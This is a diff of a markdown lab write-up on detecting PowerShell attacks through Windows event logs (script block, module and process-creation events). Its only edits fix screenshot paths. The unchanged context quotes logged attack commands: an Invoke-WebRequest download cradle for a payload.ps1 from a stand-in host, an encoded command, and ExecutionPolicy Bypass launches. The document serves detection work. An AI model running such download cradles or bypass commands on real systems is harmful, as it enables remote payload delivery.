@@ -8,7 +8,7 @@
 
 ## Attack Commands Executed
 
-![Terminal showing attack commands run](./screenshots/terminal-attack-commands-run.png)
+![Terminal showing attack commands run](./terminal-attack-commands-run.png)
 
 All four attack commands were executed from an Administrator PowerShell session after enabling logging:
 
@@ -39,7 +39,7 @@ ScriptBlockText: $c = 'Hello'
 ScriptBlock ID:  9b39043-ae3e-4211-883d-7d9f3036f391
 ```
 
-![4104 showing decoded encoded command](./screenshots/4104-encoded-command-decoded.png)
+![4104 showing decoded encoded command](./4104-encoded-command-decoded.png)
 
 > Key insight: `-EncodedCommand` provides zero protection against 4104. The decoded content is always logged.
 
@@ -54,7 +54,7 @@ ScriptBlockText: whoami
 ScriptBlock ID:  0e991c09-51ef-4d93-8c72-22cfc051e30a
 ```
 
-![4104 showing whoami execution](./screenshots/4104-whoami.png)
+![4104 showing whoami execution](./4104-whoami.png)
 
 ---
 
@@ -69,7 +69,7 @@ ScriptBlockText: Invoke-WebRequest -Uri http://example.com/payload.ps1
 ScriptBlock ID:  919b82c-d331-4696-a08c-ac18a9f2246
 ```
 
-![4104 showing Invoke-WebRequest download cradle](./screenshots/4104-invoke-webrequest.png)
+![4104 showing Invoke-WebRequest download cradle](./4104-invoke-webrequest.png)
 
 ---
 
@@ -82,7 +82,7 @@ ScriptBlockText: Get-Process
 ScriptBlock ID:  480e5d3-533c-4716-9767-7bbea795b0ce
 ```
 
-![4104 showing Get-Process execution](./screenshots/4104-get-process.png)
+![4104 showing Get-Process execution](./4104-get-process.png)
 
 ---
 
@@ -92,7 +92,7 @@ ScriptBlock ID:  480e5d3-533c-4716-9767-7bbea795b0ce
 
 Module logging was enabled via registry. Events captured pipeline execution details for background PowerShell activity on the system.
 
-![4103 module logging event](./screenshots/4103-module-logging.png)
+![4103 module logging event](./4103-module-logging.png)
 
 > Note: 4103 (Module Logging) generates high volume of background events. For focused PowerShell attack detection, 4104 (Script Block Logging) is more actionable and is what the Sigma rule targets.
 
@@ -116,7 +116,7 @@ Process Command Line: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 Computer:             EC2AMAZ-5M13VM2
 ```
 
-![4688 showing ExecutionPolicy Bypass with whoami](./screenshots/4688-executionpolicy-bypass-whoami.png)
+![4688 showing ExecutionPolicy Bypass with whoami](./4688-executionpolicy-bypass-whoami.png)
 
 ---
 
@@ -131,7 +131,7 @@ Process Command Line: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 Computer:             EC2AMAZ-5M13VM2
 ```
 
-![4688 showing NoProfile NonInteractive with Get-Process](./screenshots/4688-noprofile-noninteractive-getprocess.png)
+![4688 showing NoProfile NonInteractive with Get-Process](./4688-noprofile-noninteractive-getprocess.png)
 
 ---
 
